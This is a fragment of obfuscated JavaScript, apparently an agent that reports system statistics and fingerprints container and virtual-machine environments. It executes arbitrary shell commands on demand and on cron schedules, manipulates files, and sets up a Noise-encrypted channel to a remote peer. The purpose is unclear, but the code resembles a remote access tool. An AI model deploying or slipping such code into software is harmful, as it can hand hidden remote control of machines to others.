        this[ay(0x3d7)] += j, this['totalNetworkDown'] += k, this[ay(0x1ef)] = {
            'tx': g[ay(0x287)],
            'rx': g[ay(0x2b8)]
        }, this[ay(0x400)] = h;
        const l = await a0n['processes']();
        return {
            'cpu': { 'usage': Math[ay(0x468)](b['currentLoad']) },
            'ram': {
                'total': c[ay(0x21d)],
                'used': c[ay(0x308)]
            },
            'swap': {
                'total': c[ay(0x2f1)],
                'used': c[ay(0x21a)]
            },
            'load': {
                'load1': Math[ay(0x468)](f[ay(0x341)] * 0x64) / 0x64,
                'load5': a[ay(0x275)](Math[ay(0x468)](a['CEgek'](f['avgLoad'], 0x64)), 0x64),
                'load15': a[ay(0x355)](Math[ay(0x468)](a[ay(0x437)](f[ay(0x341)], 0x64)), 0x64)
            },
            'disk': await this[ay(0x48a)](),
            'network': {
                'up': Math[ay(0x468)](a[ay(0x40d)](j, i)),
                'down': Math[ay(0x468)](a[ay(0x368)](k, i)),
                'totalUp': this[ay(0x3d7)],
                'totalDown': this[ay(0x380)]
            },
            'connections': await this[ay(0x31b)](),
            'uptime': a0k['uptime'](),
            'process': l?.[ay(0x34c)] || 0x0,
            'message': ''
        };
    }
    async [a0T(0x4b4)]() {
        const az = a0T, a = {
                'cJgmn': az(0x440),
                'DwYOa': az(0x22c),
                'BEzRZ': az(0x3e3),
                'vXwZv': az(0x3b1),
                'ahKRf': '/proc/1/cgroup',
                'dEwjA': az(0x2ca),
                'OpbNX': az(0x438),
                'cfNwn': 'containerd',
                'OxfCJ': az(0x223),
                'XZEtu': 'Kubernetes',
                'HnKWI': az(0x3e8),
                'zuYdF': az(0x40e),
                'dIwXo': az(0x28f),
                'eDFBO': az(0x39f),
                'fnIsy': 'kubelet',
                'OVeuc': '/proc/1/environ',
                'iySIG': az(0x423),
                'aFKkW': 'QEMU',
                'anQyT': 'KVM'
            };
        try {
            if (a0h[az(0x2bf)](a['cJgmn']))
                return a['DwYOa'];
            if (a0h[az(0x2bf)](a[az(0x312)]))
                return a['vXwZv'];
            if (a0h[az(0x2bf)](a['ahKRf'])) {
                const b = a0h['readFileSync'](a[az(0x362)], a[az(0x433)])[az(0x338)]();
                if (b[az(0x376)](a['OpbNX']) || b[az(0x376)](a[az(0x2a3)]))
                    return a[az(0x2fa)];
                else {
                    if (b[az(0x376)](a['OxfCJ']))
                        return a[az(0x200)];
                    else {
                        if (b[az(0x376)](az(0x49d)))
                            return a[az(0x273)];
                    }
                }
            }
            if (a0h[az(0x2bf)](a[az(0x343)])) {
                const c = a0h['readFileSync'](a[az(0x343)], az(0x2ca));
                if (c[az(0x376)](a['dIwXo']) || c[az(0x376)]('workdir=/var/lib/docker'))
                    return az(0x22c);
                else {
                    if (c[az(0x376)](a[az(0x212)]) || c[az(0x376)](a[az(0x329)]))
                        return a[az(0x200)];
                }
            }
            if (a0h[az(0x2bf)](a['OVeuc'])) {
                const d = a0h[az(0x3cc)](a[az(0x3a4)], a[az(0x433)]);
                if (d[az(0x376)](az(0x2b3)))
                    return a[az(0x273)];
            }
            if (a0h[az(0x2bf)](a['iySIG'])) {
                const f = a0h[az(0x3cc)](a['iySIG'], a['dEwjA']);
                if (f[az(0x376)](a[az(0x2a7)]) || f[az(0x376)](a[az(0x4e3)]))
                    return 'QEMU';
            }
        } catch (g) {
        }
        return az(0x4da);
    }
    async ['_getDiskInfo']() {
        const aA = a0T, a = {
                'AHZkq': function (b, c) {
                    return b !== c;
                },
                'LPDZq': aA(0x3bf),
                'Vjheh': function (b, c) {
                    return b !== c;
                },
                'YGUbX': aA(0x4bb)
            };
        try {
            const b = await a0n[aA(0x3c6)](), c = b[aA(0x465)](g => {
                    const aB = aA;
                    return g['size'] > 0x0 && a[aB(0x4c6)](g[aB(0x4ed)], a[aB(0x40b)]) && a[aB(0x2e0)](g['type'], a[aB(0x20d)]) && g['fs'][aB(0x207)](aB(0x41b));
                }), d = c[aA(0x277)]((g, h) => g + h['size'], 0x0), f = c[aA(0x277)]((g, h) => g + h[aA(0x4ee)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0T(0x31b)]() {
        const aC = a0T;
        try {
            const a = await a0n['networkConnections'](), b = a[aC(0x465)](d => d['protocol'] === aC(0x288))[aC(0x4e9)], c = a[aC(0x465)](d => d[aC(0x2ea)] === aC(0x456))[aC(0x4e9)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0I {
    static async [a0T(0x392)](a, b = {}) {
        const aD = a0T, c = {
                'rFqlo': function (d, f) {
                    return d || f;
                },
                'CnEAB': 'number',
                'RhaIw': function (d, f) {
                    return d(f);
                },
                'gdyMR': function (d, f) {
                    return d * f;
                },
                'SKirb': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[aD(0x35d)](),
                env: env = {},
                timeout: timeout = a0E['Rtimeout']
            } = b;
        return new Promise(d => {
            const aE = aD, f = {
                    'PfcZW': function (i, j) {
                        return c['rFqlo'](i, j);
                    },
                    'LzdlE': c[aE(0x3ed)],
                    'kSvqL': function (i, j) {
                        const aF = aE;
                        return c[aF(0x4eb)](i, j);
                    }
                }, g = Date[aE(0x48c)](), h = a0l(a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['gdyMR'](timeout, 0x3e8),
                    'maxBuffer': c[aE(0x4f0)](c[aE(0x306)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const aG = aE, l = Date[aG(0x48c)]() - g, m = i && i[aG(0x2ae)] && i['signal'];
                    let n = f['PfcZW'](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            typeof i[aG(0x27a)] === f[aG(0x2ab)] ? o = i[aG(0x27a)] : o = -0x1;
                    }
                    f[aG(0x3de)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
class a0J {
    static async [a0T(0x204)](a, b = ![]) {
        const aH = a0T, c = {
                'QboVQ': aH(0x262),
                'hqeSb': aH(0x3b0),
                'XTdgE': function (h, i) {
                    return h & i;
                },
                'OjXyl': function (h, i) {
                    return h(i);
                },
                'wDfbY': function (h, i) {
                    return h || i;
                },
                'spBQn': aH(0x3f5)
            }, d = a0j['resolve'](a0E[aH(0x219)], c[aH(0x3f9)](a, '.'));
        if (!d[aH(0x207)](a0E[aH(0x219)]))
            throw new Error(aH(0x3ac));
        if (!a0h['existsSync'](d))
            throw new Error(c[aH(0x326)]);
        const f = [], g = h => {
                const aI = aH, i = a0h[aI(0x337)](h);
                for (const j of i) {
                    const k = a0j[aI(0x25e)](h, j), l = a0h[aI(0x238)](k), m = new a0A();
                    m[aI(0x385)] = j, m[aI(0x4e2)] = a0j['relative'](a0E[aI(0x219)], k), m['type'] = l['isDirectory']() ? c[aI(0x3c4)] : c['hqeSb'], m[aI(0x3ab)] = l[aI(0x3ab)], m[aI(0x409)] = l[aI(0x409)]['toISOString'](), m[aI(0x315)] = this[aI(0x4b3)](l['mode'], l[aI(0x3b9)]()), m[aI(0x2d6)] = '0o' + c['XTdgE'](l['mode'], 0x1ff)[aI(0x1d7)](0x8), m['owner'] = l[aI(0x424)] + ':' + l['gid'], f[aI(0x4d2)](m), b && l[aI(0x3b9)]() && c[aI(0x2c7)](g, k);
                }
            };
        return c[aH(0x2c7)](g, d), f;
    }
    static async ['getFilePermissions'](a) {
        const aJ = a0T, b = {
                'NpxDw': function (d, f) {
                    return d & f;
                },
                'zjpIA': aJ(0x262),
                'zgBdy': 'file'
            }, c = [];
        for (const d of a) {
            const f = a0j[aJ(0x366)](a0E['FILE_ROOT'], d);
            if (!f[aJ(0x207)](a0E[aJ(0x219)]))
                continue;
            try {
                const g = a0h['statSync'](f), h = this[aJ(0x3f6)](f, a0h['constants'][aJ(0x32c)]), i = this['_checkAccess'](f, a0h[aJ(0x41d)][aJ(0x210)]), j = this[aJ(0x3f6)](f, a0h[aJ(0x41d)][aJ(0x45e)]), k = new a0B();
                k['path'] = a0j[aJ(0x2c9)](a0E['FILE_ROOT'], f), k[aJ(0x385)] = a0j[aJ(0x289)](f), k[aJ(0x315)] = this[aJ(0x4b3)](g[aJ(0x315)], g[aJ(0x3b9)]()), k['mode_octal'] = '0o' + b[aJ(0x242)](g[aJ(0x315)], 0x1ff)[aJ(0x1d7)](0x8), k[aJ(0x4ed)] = g['isDirectory']() ? b[aJ(0x4a1)] : b[aJ(0x4f4)], k[aJ(0x372)] = h, k['writable'] = i, k[aJ(0x2d7)] = j, c[aJ(0x4d2)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0T(0x3f6)](a, b) {
        const aK = a0T;
        try {
            return a0h[aK(0x33d)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const aL = a0T, b = {
                'rRNDV': function (c, d) {
                    return c === d;
                },
                'XFunD': 'Unsupported\x20permission\x20format,\x20only\x20octal\x20strings\x20are\x20supported'
            };
        if (b[aL(0x4cc)](typeof a, aL(0x3e6)))
            return a;
        if (b['rRNDV'](typeof a, aL(0x48f))) {
            const c = a[aL(0x203)]();
            if (/^[0-7]{3,4}$/[aL(0x4d7)](c))
                return parseInt(c, 0x8);
        }
        throw new Error(b[aL(0x1e9)]);
    }
    static [a0T(0x4b3)](a, b) {
        const aM = a0T, c = {
                'lYoyf': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)['toString'](0x8)[aM(0x417)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aM(0x257)](parseInt, i, 0xa);
            h += f[aM(0x498)]((k, l) => j & 0x4 >> l ? k : '-')[aM(0x25e)]('');
        }
        return h;
    }
    static async [a0T(0x397)](a, b = ![]) {
        const aN = a0T, c = {
                'DAPqQ': function (g, h) {
                    return g(h);
                },
                'gviAV': function (g, h) {
                    return g(h);
                },
                'Tovzl': 'access_denied',
                'mPGWK': function (g, h) {
                    return g(h);
                },
                'UABJy': aN(0x356)
            }, d = [];
        for (const [g, h] of Object[aN(0x237)](a)) {
            const i = a0j[aN(0x366)](a0E[aN(0x219)], g);
            if (!i[aN(0x207)](a0E[aN(0x219)])) {
                d[aN(0x4d2)]({
                    'path': g,
                    'requested': c[aN(0x34e)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['Tovzl']
                });
                continue;
            }
            try {
                const j = this[aN(0x382)](h), k = m => {
                        const aO = aN;
                        a0h[aO(0x3d0)](m, j);
                    };
                if (b && a0h[aN(0x2bf)](i) && a0h['statSync'](i)[aN(0x3b9)]()) {
                    const m = n => {
                        const aP = aN;
                        k(n);
                        const o = a0h[aP(0x337)](n);
                        for (const p of o) {
                            const q = a0j[aP(0x25e)](n, p);
                            a0h[aP(0x238)](q)[aP(0x3b9)]() ? c[aP(0x415)](m, q) : c['DAPqQ'](k, q);
                        }
                    };
                    m(i);
                } else
                    c[aN(0x33e)](k, i);
                const l = j['toString'](0x8);
                d[aN(0x4d2)]({
                    'path': g,
                    'requested': c['gviAV'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[aN(0x4d2)]({
                    'path': g,
                    'requested': c[aN(0x415)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[aN(0x24a)],
                    'message': n[aN(0x476)]
                });
            }
        }
        const f = d[aN(0x465)](o => o['status'] === 'ok')[aN(0x4e9)];
        return {
            'status': 'ok',
            'total': d[aN(0x4e9)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const aQ = a0T, b = {
                'hkWYY': aQ(0x3ac),
                'IlooQ': aQ(0x4dd),
                'isQkK': 'utf8',
                'DBmmQ': aQ(0x4ce),
                'pagOe': 'utf-8'
            }, c = a0j[aQ(0x366)](a0E[aQ(0x219)], a);
        if (!c[aQ(0x207)](a0E[aQ(0x219)]))
            throw new Error(b['hkWYY']);
        const d = a0h['statSync'](c);
        if (d[aQ(0x3ab)] > 0x400 * 0x400)
            throw new Error(b['IlooQ']);
        const f = a0h['readFileSync'](c), g = this[aQ(0x3d6)](f);
        return {
            'status': 'ok',
            'path': a0j[aQ(0x2c9)](a0E['FILE_ROOT'], c),
            'content': g ? a0p['fromByteArray'](f) : f[aQ(0x1d7)](b[aQ(0x381)]),
            'encoding': g ? b[aQ(0x483)] : b[aQ(0x26a)],
            'is_binary': g,
            'size': d[aQ(0x3ab)]
        };
    }
    static [a0T(0x3d6)](a) {
        const aR = a0T, b = {
                'QqDkt': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[aR(0x4f2)](a[aR(0x4e9)], 0x0))
            return ![];
        for (let c = 0x0; c < Math[aR(0x3e9)](a[aR(0x4e9)], 0x200); c++) {
            if (b['QqDkt'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0T(0x496)](a, b, c, d = null, f = null) {
        const aS = a0T, g = {
                'VVlzY': aS(0x4dd),
                'YJDQz': function (l, m) {
                    return l !== m;
                },
                'MisJJ': function (l, m) {
                    return l(m);
                },
                'xUCGs': aS(0x4b0),
                'koLRj': function (l, m) {
                    return l === m;
                },
                'fKALP': function (l, m) {
                    return l < m;
                }
            }, h = a0j[aS(0x366)](a0E[aS(0x219)], a);
        let j = h;
        b && (j = a0j[aS(0x25e)](h, b));
        if (!j[aS(0x207)](a0E[aS(0x219)]))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        !a0h[aS(0x2bf)](a0j[aS(0x435)](j)) && a0h[aS(0x378)](a0j[aS(0x435)](j), { 'recursive': !![] });
        const k = a0p[aS(0x274)](c);
        if (k[aS(0x4e9)] > a0E[aS(0x45f)])
            throw new Error(g[aS(0x2af)]);
        if (g[aS(0x475)](d, null) && f !== null) {
            const l = Number(d), m = g[aS(0x3fd)](Number, f);
            if (Number[aS(0x426)](l) || Number[aS(0x426)](m))
                throw new Error(g[aS(0x373)]);
            const n = a0j[aS(0x25e)](a0j[aS(0x435)](j), aS(0x395), a0j['basename'](j));
            !a0h['existsSync'](n) && a0h[aS(0x378)](n, { 'recursive': !![] });
            const o = a0j['join'](n, aS(0x374) + l);
            a0h[aS(0x4ea)](o, k);
            const p = a0h[aS(0x337)](n)[aS(0x465)](s => s[aS(0x207)](aS(0x374))), q = p[aS(0x4e9)], r = g[aS(0x33a)](q, m);
            if (r) {
                const s = a0h['createWriteStream'](j);
                for (let t = 0x0; g[aS(0x268)](t, m); t++) {
                    const u = a0j['join'](n, 'chunk_' + t);
                    if (!a0h[aS(0x2bf)](u)) {
                        s[aS(0x22a)]();
                        throw new Error(aS(0x41f) + t);
                    }
                    s[aS(0x455)](a0h[aS(0x3cc)](u));
                }
                s[aS(0x2d5)]();
                for (const v of a0h[aS(0x337)](n)) {
                    a0h[aS(0x445)](a0j['join'](n, v));
                }
                a0h['rmdirSync'](n, { 'recursive': !![] });
            }
            return {
                'status': 'ok',
                'path': a0j[aS(0x2c9)](a0E[aS(0x219)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aS(0x4ea)](j, k), {
            'status': 'ok',
            'path': a0j[aS(0x2c9)](a0E['FILE_ROOT'], j),
            'received': k[aS(0x4e9)],
            'total': k[aS(0x4e9)],
            'chunked': ![]
        };
    }
    static async [a0T(0x211)](a) {
        const aT = a0T, b = {
                'UozdS': aT(0x3ac),
                'zjYgl': aT(0x4b1)
            }, c = a0j[aT(0x366)](a0E[aT(0x219)], a);
        if (!c[aT(0x207)](a0E[aT(0x219)]))
            throw new Error(b['UozdS']);
        if (!a0h[aT(0x2bf)](c))
            throw new Error(b[aT(0x26f)]);
        const d = a0h[aT(0x238)](c), f = a0h[aT(0x3cc)](c), g = a0p[aT(0x2db)](f);
        return {
            'path': a0j[aT(0x2c9)](a0E[aT(0x219)], c),
            'content': g,
            'size': d['size']
        };
    }
    static async [a0T(0x420)](a) {
        const aU = a0T, b = {
                'DiNYH': 'access_denied',
                'GbLMm': 'deleted',
                'sVDsk': 'not_found',
                'qzDnF': aU(0x356)
            }, c = [];
        for (const d of a) {
            const f = a0j[aU(0x366)](a0E['FILE_ROOT'], d);
            if (!f[aU(0x207)](a0E[aU(0x219)])) {
                c[aU(0x4d2)]({
                    'path': d,
                    'status': b[aU(0x2c8)]
                });
                continue;
            }
            try {
                if (a0h[aU(0x2bf)](f)) {
                    const g = a0h[aU(0x238)](f);
                    g[aU(0x3b9)]() ? a0h[aU(0x26b)](f, { 'recursive': !![] }) : a0h[aU(0x445)](f), c[aU(0x4d2)]({
                        'path': d,
                        'status': b['GbLMm']
                    });
                } else
                    c[aU(0x4d2)]({
                        'path': d,
                        'status': b[aU(0x3f3)]
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': b[aU(0x278)],
                    'message': h[aU(0x476)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const aV = a0T, b = {
                'MLjrR': aV(0x3e1),
                'IGHnf': aV(0x356)
            }, c = [];
        for (const [d, f] of Object[aV(0x237)](a)) {
            const g = a0j[aV(0x366)](a0E[aV(0x219)], d), h = a0j['resolve'](a0E['FILE_ROOT'], f);
            if (!g[aV(0x207)](a0E[aV(0x219)]) || !h[aV(0x207)](a0E[aV(0x219)])) {
                c[aV(0x4d2)]({
                    'from': d,
                    'to': f,
                    'status': b[aV(0x340)]
                });
                continue;
            }
            try {
                const i = a0j[aV(0x435)](h);
                !a0h[aV(0x2bf)](i) && a0h[aV(0x378)](i, { 'recursive': !![] }), a0h['renameSync'](g, h), c[aV(0x4d2)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[aV(0x4d2)]({
                    'from': d,
                    'to': f,
                    'status': b[aV(0x30e)],
                    'message': j[aV(0x476)]
                });
            }
        }
        return c;
    }
    static async [a0T(0x4ac)](a) {
        const aW = a0T, b = {
                'ekpJY': function (d, f, g) {
                    return d(f, g);
                },
                'VfrCt': 'access_denied',
                'XlEtv': 'not_found',
                'LUZIv': aW(0x356)
            }, c = [];
        for (const [d, f] of Object[aW(0x237)](a)) {
            const g = a0j[aW(0x366)](a0E[aW(0x219)], d), h = a0j[aW(0x366)](a0E[aW(0x219)], f);
            if (!g[aW(0x207)](a0E[aW(0x219)]) || !h['startsWith'](a0E[aW(0x219)])) {
                c[aW(0x4d2)]({
                    'from': d,
                    'to': f,
                    'status': b[aW(0x4de)]
                });
                continue;
            }
            try {
                if (!a0h[aW(0x2bf)](g)) {
                    c[aW(0x4d2)]({
                        'from': d,
                        'to': f,
                        'status': b[aW(0x42a)]
                    });
                    continue;
                }
                const i = a0j['dirname'](h);
                !a0h['existsSync'](i) && a0h['mkdirSync'](i, { 'recursive': !![] });
                const j = a0h[aW(0x238)](g);
                if (j[aW(0x3b9)]()) {
                    if (a0h[aW(0x24b)])
                        a0h[aW(0x24b)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aX = aW;
                            if (a0h[aX(0x238)](l)[aX(0x3b9)]()) {
                                if (!a0h['existsSync'](m))
                                    a0h[aX(0x378)](m, { 'recursive': !![] });
                                for (const n of a0h['readdirSync'](l)) {
                                    b[aX(0x485)](k, a0j[aX(0x25e)](l, n), a0j[aX(0x25e)](m, n));
                                }
                            } else
                                a0h[aX(0x27b)](l, m);
                        };
                        b['ekpJY'](k, g, h);
                    }
                } else
                    a0h[aW(0x27b)](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[aW(0x4d2)]({
                    'from': d,
                    'to': f,
                    'status': b[aW(0x4c9)],
                    'message': l[aW(0x476)]
                });
            }
        }
        return c;
    }
    static async [a0T(0x24d)](a) {
        const aY = a0T, b = { 'NRHtn': aY(0x3ac) }, c = a0j[aY(0x366)](a0E[aY(0x219)], a);
        if (!c[aY(0x207)](a0E[aY(0x219)]))
            throw new Error(b[aY(0x320)]);
        return a0h['mkdirSync'](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j[aY(0x2c9)](a0E[aY(0x219)], c)
        };
    }
}
class a0K {
    static [a0T(0x40a)] = new Map();
    static ['_appendLog'](a, b) {
        const aZ = a0T, c = {
                'lyUuw': function (d, f) {
                    return d > f;
                },
                'KkLHe': function (d, f) {
                    return d - f;
                }
            };
        a[aZ(0x4d2)](b), c[aZ(0x439)](a[aZ(0x4e9)], a0E['MAX_TASK_LOG_SIZE']) && a[aZ(0x26e)](0x0, c['KkLHe'](a[aZ(0x4e9)], a0E[aZ(0x405)]));
    }
    static [a0T(0x2da)](a, b, c, d, f = null) {
        const b0 = a0T, g = new Date()['toISOString']();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + '\x20----\x20' + a + b0(0x216) + c + '\x0a' + (b?.[b0(0x203)]() || '')
        };
    }
    static [a0T(0x4dc)]() {
        const b1 = a0T;
        return {
            'status': 'ok',
            'count': a0E[b1(0x2cf)][b1(0x4e9)],
            'tasks': a0E[b1(0x2cf)]
        };
    }
    static async [a0T(0x27d)](a) {
        const b2 = a0T, b = {
                'Tqwhr': 'onetime',
                'MPHdP': function (d, f) {
                    return d === f;
                },
                'iKrkk': b2(0x356)
            };
        a0E[b2(0x2cf)] = a || [], a0E[b2(0x283)] = !![];
        const c = [];
        for (let d = 0x0; d < a0E[b2(0x2cf)]['length']; d++) {
            const f = a0E[b2(0x2cf)][d], g = await a0I[b2(0x392)](f), h = this[b2(0x2da)](f, g['result'], g[b2(0x38f)], b[b2(0x454)]);
            this[b2(0x2ef)](a0E[b2(0x231)], h), c[b2(0x4d2)]({
                'index': d,
                'cmd': f,
                'exitcode': g['exitcode'],
                'output': g[b2(0x3ec)],
                'status': b['MPHdP'](g[b2(0x38f)], 0x0) ? 'ok' : b[b2(0x301)]
            });
        }
        return a0E[b2(0x283)] = ![], {
            'status': 'ok',
            'count': a0E['onetasks']['length'],
            'tasks': a0E[b2(0x2cf)],
            'executed': c
        };
    }
    static [a0T(0x27c)]() {
        const b3 = a0T;
        return {
            'status': 'ok',
            'count': Object[b3(0x3bb)](a0E[b3(0x3cb)])[b3(0x4e9)],
            'tasks': a0E['crontasks']
        };
    }
    static ['setCronTasks'](a) {
        const b4 = a0T, b = {
                'QhFWz': b4(0x36d),
                'UHGBS': function (d, f) {
                    return d === f;
                },
                'OjIEV': b4(0x254),
                'AvoWR': function (d, f) {
                    return d > f;
                },
                'rqcts': b4(0x356),
                'eWeGC': function (d, f) {
                    return d - f;
                },
                'XEJkY': function (d, f) {
                    return d || f;
                },
                'GHdhl': function (d, f) {
                    return d > f;
                }
            };
        this[b4(0x40a)][b4(0x347)](d => {
            const b5 = b4;
            typeof d['stop'] === b[b5(0x383)] && d[b5(0x303)](), b[b5(0x453)](typeof d[b5(0x3ef)], b[b5(0x383)]) && d['destroy']();
        }), this[b4(0x40a)]['clear']();
        const c = [];
        for (const d of Object[b4(0x3bb)](a || {})) {
            !a0m[b4(0x297)](d) && c[b4(0x4d2)](d);
        }
        if (b['AvoWR'](c['length'], 0x0))
            return {
                'status': b[b4(0x387)],
                'message': b4(0x23e) + c['join'](',\x20'),
                'valid_count': b['eWeGC'](Object[b4(0x3bb)](b[b4(0x3b8)](a, {}))['length'], c[b4(0x4e9)])
            };
        a0E['crontasks'] = b[b4(0x3b8)](a, {});
        for (const [f, g] of Object[b4(0x237)](a0E[b4(0x3cb)])) {
            const h = a0m[b4(0x3d3)](f, async () => {
                const b6 = b4, i = await a0I['execute'](g), j = this[b6(0x2da)](g, i[b6(0x3ec)], i[b6(0x38f)], b['OjIEV'], f);
                this['_appendLog'](a0E[b6(0x2ad)], j);
            });
            this[b4(0x40a)][b4(0x4d0)](f, h);
        }
        return a0E['cronloop'] = b[b4(0x46f)](Object[b4(0x3bb)](a0E['crontasks'])[b4(0x4e9)], 0x0), {
            'status': 'ok',
            'count': Object[b4(0x3bb)](a0E[b4(0x3cb)])['length'],
            'tasks': a0E[b4(0x3cb)]
        };
    }
    static ['getTaskStatus']() {
        const b7 = a0T;
        return {
            'onetime': {
                'pending': a0E[b7(0x283)],
                'count': a0E['onetasks'][b7(0x4e9)]
            },
            'cron': {
                'active': a0E[b7(0x1ee)],
                'count': Object[b7(0x3bb)](a0E[b7(0x3cb)])[b7(0x4e9)],
                'check_interval': a0E[b7(0x30b)]
            }
        };
    }
    static [a0T(0x2f7)](a = 0x32) {
        const b8 = a0T, b = a0E['onetimetasks_log'][b8(0x2f0)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0T(0x413)](a = 0x32) {
        const b9 = a0T, b = a0E['crontasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b[b9(0x4e9)],
            'logs': b
        };
    }
    static [a0T(0x44f)]() {
        const ba = a0T, a = a0E[ba(0x231)]['length'];
        return a0E[ba(0x231)] = [], {
            'status': 'ok',
            'cleared': ba(0x44c)
        };
    }
    static [a0T(0x361)]() {
        const bb = a0T, a = { 'VkhYT': 'cron' }, b = a0E[bb(0x2ad)][bb(0x4e9)];
        return a0E['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a[bb(0x2c6)]
        };
    }
    static [a0T(0x266)]() {
        const bc = a0T, a = {
                'zjZUK': function (g, h) {
                    return g - h;
                }
            }, b = a0E['onetimetasks_log']['filter'](g => g[bc(0x38f)] === 0x0)[bc(0x4e9)], c = a[bc(0x4bf)](a0E['onetimetasks_log']['length'], b), d = a0E[bc(0x2ad)]['filter'](g => g[bc(0x38f)] === 0x0)[bc(0x4e9)], f = a[bc(0x4bf)](a0E['crontasks_log'][bc(0x4e9)], d);
        return {
            'onetime': {
                'total_logged': a0E['onetimetasks_log'][bc(0x4e9)],
                'max_capacity': a0E[bc(0x405)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0E[bc(0x2ad)]['length'],
                'max_capacity': a0E['MAX_TASK_LOG_SIZE'],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0T(0x449)]() {
        const bd = a0T, a = {
                'cwmiA': function (c, d) {
                    return c < d;
                },
                'vdXYf': bd(0x44c)
            }, b = [];
        for (let c = 0x0; a[bd(0x4bc)](c, a0E[bd(0x2cf)][bd(0x4e9)]); c++) {
            const d = a0E['onetasks'][c], f = await a0I[bd(0x392)](d), g = this[bd(0x2da)](d, f[bd(0x3ec)], f[bd(0x38f)], a[bd(0x2e4)]);
            this['_appendLog'](a0E[bd(0x231)], g), b[bd(0x4d2)]({
                'cmd': d,
                'exitcode': f[bd(0x38f)],
                'output': f[bd(0x3ec)],
                'timeout': f[bd(0x2de)]
            });
        }
        return a0E['InitTask'] = ![], {
            'status': 'ok',
            'executed': b[bd(0x4e9)],
            'results': b
        };
    }
}
let a0L = null, a0M = null;
const a0N = new Promise((a, b) => {
    const be = a0T, c = {
            'rVdOB': be(0x464),
            'UiACN': be(0x1dc),
            'yHKPX': function (d) {
                return d();
            },
            'FxZot': be(0x3e5),
            'cwSuD': function (d, f) {
                return d(f);
            },
            'aMqVb': be(0x3df),
            'uLArh': function (d) {
                return d();
            }
        };
    try {
        c[be(0x4b9)](a0r, function (d) {
            const bf = be;
            if (!d) {
                a0M = new Error(c[bf(0x3c0)]), a0u[bf(0x324)](c[bf(0x21e)], a0M[bf(0x476)]), c[bf(0x370)](a);
                return;
            }
            a0L = d, a0u[bf(0x1ff)](c['FxZot']), a();
        });
    } catch (d) {
        a0M = d, a0u[be(0x324)](c[be(0x2c0)], d[be(0x476)]), c[be(0x2b2)](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const bg = a0T;
    a0u[bg(0x356)]('Unhandled\x20Promise\x20Rejection:', a);
}), process['on'](a0T(0x477), a => {
    const bh = a0T, b = { 'ntAWO': bh(0x261) };
    a0u[bh(0x356)](b[bh(0x3c7)], a), process[bh(0x317)](0x1);
});
class a0O {
    constructor(a, b, c) {
        const bi = a0T, d = { 'VswVx': bi(0x43c) }, f = d[bi(0x1f6)][bi(0x42e)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['isInitiator'] = a;
                continue;
            case '1':
                this[bi(0x3a0)] = b;
                continue;
            case '2':
                this['hs'] = null;
                continue;
            case '3':
                this[bi(0x3b7)] = ![];
                continue;
            case '4':
                this[bi(0x4c8)] = c;
                continue;
            case '5':
                this[bi(0x284)] = null;
                continue;
            case '6':
                this[bi(0x228)] = null;
                continue;
            }
            break;
        }
    }
    async [a0T(0x3b3)]() {
        const bj = a0T, a = {
                'QBUOs': bj(0x492),
                'OPVFP': bj(0x304),
                'tmWvK': bj(0x4ce)
            };
        await a0N;
        if (!a0L)
            throw a0M || new Error(a['QBUOs']);
        const b = a0L, c = this[bj(0x469)] ? b[bj(0x41d)][bj(0x48e)] : b[bj(0x41d)][bj(0x45c)];
        this['hs'] = b['HandshakeState']('Noise_XX_25519_ChaChaPoly_BLAKE2s', c);
        const d = Buffer[bj(0x2d9)](a[bj(0x280)]), f = this[bj(0x3a0)] ? Buffer['from'](this['localPrivB64'], a[bj(0x339)]) : null, g = this[bj(0x4c8)] ? Buffer[bj(0x2d9)](this[bj(0x4c8)], a[bj(0x339)]) : null;
        this['hs'][bj(0x45d)](d, f, g, null);
    }
    ['processHandshake'](a) {
        const bk = a0T, b = {
                'hINvW': function (d, f) {
                    return d > f;
                },
                'UkMfi': function (d, f) {
                    return d === f;
                }
            };
        if (this[bk(0x3b7)])
            return Buffer[bk(0x36b)](0x0);
        const c = a0L;
